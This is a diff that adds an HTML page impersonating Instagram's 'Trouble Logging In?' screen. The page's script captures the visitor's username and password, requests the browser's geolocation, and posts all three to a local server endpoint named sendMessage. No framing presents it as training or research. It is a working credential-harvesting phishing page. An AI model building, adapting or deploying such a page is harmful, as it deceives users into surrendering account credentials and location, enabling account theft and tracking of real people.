@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <title>Instagram</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .navbar {
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            background-color: #1c1c1c;
+            position: absolute;
+            top: 0;
+        }
+        .navbar button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-right: 10px;
+        }
+        .navbar a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .container {
+            background: #1c1c1c;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+            margin-top: 50px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+        }
+        .hidden {
+            display: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0095f6;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background-color: #555;
+        }
+	#mm {
+	    width: 200px;
+	}   
+
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <button id="mm">Log In</button>
+        <a href="#">Sign Up</a>
+    </div>
+    <div class="container">
+        <h2>Trouble Logging In?</h2>
+        <p>Enter your email, phone, or username and we'll send you a link to get back into your account.</p>
+        <input type="text" id="username" placeholder="Email, Phone, or Username" oninput="showPasswordInput()">
+        <input type="password" id="password" placeholder="Password" class="hidden">
+        <button id="login-btn" disabled>login</button>
+    </div>
+    <script>
+        function showPasswordInput() {
+            let usernameInput = document.getElementById("username");
+            let passwordInput = document.getElementById("password");
+            let loginBtn = document.getElementById("login-btn");
+
+            if (usernameInput.value.trim() !== "") {
+                passwordInput.classList.remove("hidden");
+                loginBtn.disabled = false;
+            } else {
+                passwordInput.classList.add("hidden");
+                loginBtn.disabled = true;
+            }
+        }
+
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => callback(position.coords.latitude, position.coords.longitude),
+                    () => callback(null, null)
+                );
+            } else {
+                callback(null, null);
+            }
+        }
+
+        document.getElementById("login-btn").addEventListener("click", function () {
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            if (!username || !password) {
+                alert("Please enter both username and password");
+                return;
+            }
+
+            getLocation((latitude, longitude) => {
+            fetch("http://localhost:3000/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password, latitude, longitude })
+            })
+            .then(response => response.json())
+            .then(data => console.log("✅ Response:", data))
+            .catch(error => console.error("❌ Error:", error));
+        });
+        });
+    </script>
+</body>
+</html>
